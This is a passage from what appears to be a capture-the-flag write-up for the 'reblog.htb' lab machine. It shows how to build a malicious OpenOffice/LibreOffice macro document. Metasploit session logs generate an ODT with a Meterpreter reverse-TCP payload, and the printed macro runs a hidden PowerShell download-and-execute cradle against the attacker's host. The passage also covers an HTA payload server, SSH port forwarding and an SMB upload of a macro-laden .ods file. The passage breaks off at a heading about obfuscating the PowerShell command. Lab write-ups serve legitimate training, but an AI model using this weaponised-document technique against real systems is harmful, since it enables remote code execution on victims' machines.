</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf5 &gt; spool msf.log
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Spooling to file msf.log...
msf5 &gt; search openoffice

Matching <span style="color:#8be9fd;font-style:italic">Modules</span>
<span style="color:#ff79c6">================</span>

   <span style="color:#6272a4">#  Name                                          Disclosure Date  Rank       Check  Description</span>
   -  ----                                          ---------------  ----       -----  -----------
   <span style="color:#bd93f9">0</span>  auxiliary/fileformat/odt_badodt               2018-05-01       normal     No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
   <span style="color:#bd93f9">1</span>  exploit/multi/misc/openoffice_document_macro  2017-02-08       excellent  No     Apache OpenOffice Text Document Malicious Macro Execution
   <span style="color:#bd93f9">2</span>  exploit/windows/fileformat/openoffice_ole     2008-04-17       normal     No     OpenOffice OLE Importer DocumentSummaryInformation Stream Handling Overflow

msf5 &gt; use exploit/multi/misc/openoffice_document_macro
msf5 exploit<span style="color:#ff79c6">(</span>multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span> &gt; options

Module options <span style="color:#ff79c6">(</span>exploit/multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BODY                       no        The message <span style="color:#ff79c6">for</span> the document body
   FILENAME  msf.odt          yes       The OpoenOffice Text document name
   SRVHOST   0.0.0.0          yes       The <span style="color:#8be9fd;font-style:italic">local</span> host to listen on. This must be an address on the <span style="color:#8be9fd;font-style:italic">local</span> machine or 0.0.0.0
   SRVPORT   <span style="color:#bd93f9">8080</span>             yes       The <span style="color:#8be9fd;font-style:italic">local</span> port to listen on.
   SSL       <span style="color:#8be9fd;font-style:italic">false</span>            no        Negotiate SSL <span style="color:#ff79c6">for</span> incoming connections
   SSLCert                    no        Path to a custom SSL certificate <span style="color:#ff79c6">(</span>default is randomly generated<span style="color:#ff79c6">)</span>
   URIPATH                    no        The URI to use <span style="color:#ff79c6">for</span> this exploit <span style="color:#ff79c6">(</span>default is random<span style="color:#ff79c6">)</span>


Exploit target:

   Id  Name
   --  ----
   <span style="color:#bd93f9">0</span>   Apache OpenOffice on Windows <span style="color:#ff79c6">(</span>PSH<span style="color:#ff79c6">)</span>

msf5 exploit<span style="color:#ff79c6">(</span>multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> BODY this is a <span style="color:#8be9fd;font-style:italic">test</span>
<span style="color:#8be9fd;font-style:italic">BODY</span> <span style="color:#ff79c6">=</span>&gt; this is a <span style="color:#8be9fd;font-style:italic">test</span>
msf5 exploit<span style="color:#ff79c6">(</span>multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> SRVHOST 127.0.0.1
<span style="color:#8be9fd;font-style:italic">SRVHOST</span> <span style="color:#ff79c6">=</span>&gt; 127.0.0.1
msf5 exploit<span style="color:#ff79c6">(</span>multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> LHOST 10.10.14.73
<span style="color:#8be9fd;font-style:italic">LHOST</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.73
msf5 exploit<span style="color:#ff79c6">(</span>multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> LPORT <span style="color:#bd93f9">8000</span>
<span style="color:#8be9fd;font-style:italic">LPORT</span> <span style="color:#ff79c6">=</span>&gt; <span style="color:#bd93f9">8000</span>
msf5 exploit<span style="color:#ff79c6">(</span>multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span> &gt; show options

Module options <span style="color:#ff79c6">(</span>exploit/multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BODY      this is a <span style="color:#8be9fd;font-style:italic">test</span>   no        The message <span style="color:#ff79c6">for</span> the document body
   FILENAME  msf.odt          yes       The OpoenOffice Text document name
   SRVHOST   127.0.0.1        yes       The <span style="color:#8be9fd;font-style:italic">local</span> host to listen on. This must be an address on the <span style="color:#8be9fd;font-style:italic">local</span> machine or 0.0.0.0
   SRVPORT   <span style="color:#bd93f9">8080</span>             yes       The <span style="color:#8be9fd;font-style:italic">local</span> port to listen on.
   SSL       <span style="color:#8be9fd;font-style:italic">false</span>            no        Negotiate SSL <span style="color:#ff79c6">for</span> incoming connections
   SSLCert                    no        Path to a custom SSL certificate <span style="color:#ff79c6">(</span>default is randomly generated<span style="color:#ff79c6">)</span>
   URIPATH                    no        The URI to use <span style="color:#ff79c6">for</span> this exploit <span style="color:#ff79c6">(</span>default is random<span style="color:#ff79c6">)</span>


Payload options <span style="color:#ff79c6">(</span>windows/meterpreter/reverse_tcp<span style="color:#ff79c6">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique <span style="color:#ff79c6">(</span>Accepted: <span style="color:#f1fa8c">&#39;&#39;</span>, seh, thread, process, none<span style="color:#ff79c6">)</span>
   LHOST     10.10.14.73      yes       The listen address <span style="color:#ff79c6">(</span>an interface may be specified<span style="color:#ff79c6">)</span>
   LPORT     <span style="color:#bd93f9">8000</span>             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   <span style="color:#bd93f9">0</span>   Apache OpenOffice on Windows <span style="color:#ff79c6">(</span>PSH<span style="color:#ff79c6">)</span>
msf5 exploit<span style="color:#ff79c6">(</span>multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span> &gt; run
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Exploit running as background job 4.
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Exploit completed, but no session was created.
msf5 exploit<span style="color:#ff79c6">(</span>multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span> &gt;
<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.73:8000:-  -
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:8000
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using URL: http://127.0.0.1:8080/73nAC2i7xc
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Server started.
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Generating our odt file <span style="color:#ff79c6">for</span> Apache OpenOffice on Windows <span style="color:#ff79c6">(</span>PSH<span style="color:#ff79c6">)</span>...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Basic
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Basic/Standard
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: Basic/Standard/Module1.xml
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: Basic/Standard/script-lb.xml
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: Basic/script-lc.xml
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: content.xml
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/META-INF
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: META-INF/manifest.xml
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: mimetype
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: meta.xml
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Thumbnails
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: Thumbnails/thumbnail.png
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: styles.xml
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: manifest.rdf
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Configurations2
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging directory: /opt/metasploit-framework/embedded/framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: Configurations2/accelerator/current.xml
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Packaging file: settings.xml
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> msf.odt stored at /home/ctf/.msf4/local/msf.odt

msf5 exploit<span style="color:#ff79c6">(</span>multi/misc/openoffice_document_macro<span style="color:#ff79c6">)</span> &gt; quit
</code></pre></td></tr></table>
</div>
</div><p>We now need to edit our evil macro with the address and port of our local machine. We can explode the zip file and overwrite the macro module:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@15bec4805337:~/htb$ cp /home/ctf/.msf4/local/msf2.odt .
ctf@15bec4805337:~/htb$ unzip msf2.odt -d weapon
ctf@15bec4805337:~/htb$ find weapon/ | grep -i module
weapon/Basic/Standard/Module1.xml
ctf@15bec4805337:~/htb$ vi weapon/Basic/Standard/Module1.xml
ctf@15bec4805337:~/htb$ cat weapon/Basic/Standard/Module1.xml
&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
    Sub Exploit
      Shell<span style="color:#ff79c6">(</span>&amp;quot;cmd.exe /C &amp;quot;&amp;quot;powershell.exe -nop -w hidden -c <span style="color:#8be9fd;font-style:italic">$j</span><span style="color:#ff79c6">=</span>new-object net.webclient;<span style="color:#ff79c6">if</span><span style="color:#ff79c6">([</span>System.Net.WebProxy<span style="color:#ff79c6">]</span>::GetDefaultProxy<span style="color:#ff79c6">()</span>.address -ne <span style="color:#8be9fd;font-style:italic">$null</span><span style="color:#ff79c6">){</span><span style="color:#8be9fd;font-style:italic">$j</span>.proxy<span style="color:#ff79c6">=[</span>Net.WebRequest<span style="color:#ff79c6">]</span>::GetSystemWebProxy<span style="color:#ff79c6">()</span>;<span style="color:#8be9fd;font-style:italic">$j</span>.Proxy.Credentials<span style="color:#ff79c6">=[</span>Net.CredentialCache<span style="color:#ff79c6">]</span>::DefaultCredentials;<span style="color:#ff79c6">}</span>;IEX <span style="color:#ff79c6">((</span>new-object Net.WebClient<span style="color:#ff79c6">)</span>.DownloadString<span style="color:#ff79c6">(</span>&amp;<span style="color:#6272a4">#39;http://10.10.14.73:8080/Sleo5QXcLanq&amp;#39;));&amp;quot;&amp;quot;&amp;quot;)</span>
    End Sub
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
ctf@a354c88a22ac:~/htb$ <span style="color:#8be9fd;font-style:italic">cd</span> weapon
ctf@a354c88a22ac:~/htb/weapon$ zip -r malicious.odt ./*
ctf@a354c88a22ac:~/htb/weapon$ mv malicious.odt ..
</code></pre></td></tr></table>
</div>
</div><p>We can now focus on the server side of the exploit by spinning of a malicious HTA Web server.
However as we are using a docker container running on Mac, we have first to forward few ports
from our VPN interface 10.10.14.73 towards our docker-machine hosting ip address</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh username@127.0.0.1 -L 10.10.14.73:8080:192.168.XXX.XXX:8080 10.10.14.73:8000:192.168.XXX.XXX:8000
netstat -aln | grep <span style="color:#bd93f9">8080</span>
tcp4       <span style="color:#bd93f9">0</span>      <span style="color:#bd93f9">0</span>  10.10.14.73.8080       *.*                    LISTEN
</code></pre></td></tr></table>
</div>
</div><p>traffic from VPN is now redirected to our attacking machine</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf5 &gt; use exploit/windows/misc/hta_server
msf5 exploit<span style="color:#ff79c6">(</span>windows/misc/hta_server<span style="color:#ff79c6">)</span> &gt; run
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Exploit running as background job 0.
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Exploit completed, but no session was created.

<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 172.17.0.3:4444
msf5 exploit<span style="color:#ff79c6">(</span>windows/misc/hta_server<span style="color:#ff79c6">)</span> &gt; <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using URL: http://0.0.0.0:8080/z8ztbA5.hta
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Local IP: http://172.17.0.3:8080/z8ztbA5.hta
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Server started.:
msf5 exploit<span style="color:#ff79c6">(</span>windows/misc/hta_server<span style="color:#ff79c6">)</span> &gt; ss -lntp | grep <span style="color:#bd93f9">8080</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> exec: ss -lntp | grep <span style="color:#bd93f9">80</span>

LISTEN   <span style="color:#bd93f9">0</span>         <span style="color:#bd93f9">0</span>                 127.0.0.1:8080             0.0.0.0:*        users:<span style="color:#ff79c6">((</span><span style="color:#f1fa8c">&#34;ruby&#34;</span>,pid<span style="color:#ff79c6">=</span>333,fd<span style="color:#ff79c6">=</span>13<span style="color:#ff79c6">))</span>
LISTEN   <span style="color:#bd93f9">0</span>         <span style="color:#bd93f9">0</span>                   0.0.0.0:8000             0.0.0.0:*        users:<span style="color:#ff79c6">((</span><span style="color:#f1fa8c">&#34;ruby&#34;</span>,pid<span style="color:#ff79c6">=</span>333,fd<span style="color:#ff79c6">=</span>7<span style="color:#ff79c6">))</span>
</code></pre></td></tr></table>
</div>
</div><p>Sending the malicious odt file was not successful as we did not get a shell in return, so we edit the file with a simpler macro that simply ping our machine <code>Shell(&quot;ping -n 1 10.10.14.73&quot;)</code>. On our host, we starts <code>tcpdump -i utun4 icmp</code> to capture ICMP protocol. Unfortunately we are not succesful. Referring at the reblog.htb website blog posts, we should try instead *.ods file. Not being able to generate such file with metasploit, I download libreoffice and generate a macro in a ping.ods file customized to load the macro module when the document is Loaded.
Indeed, after <code>smb: \&gt; put ping.ods</code> we can see our ICMP traffic:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">% sudo tcpdump -i utun4 icmp
13:58:00.705685 IP reblog.htb &gt; 10.10.14.73: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 1, seq 1, length <span style="color:#bd93f9">40</span>
13:58:00.705746 IP 10.10.14.73 &gt; reblog.htb: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 1, seq 1, length <span style="color:#bd93f9">40</span>
</code></pre></td></tr></table>
</div>
</div><p>Further obfuscation of the powershell command</p>
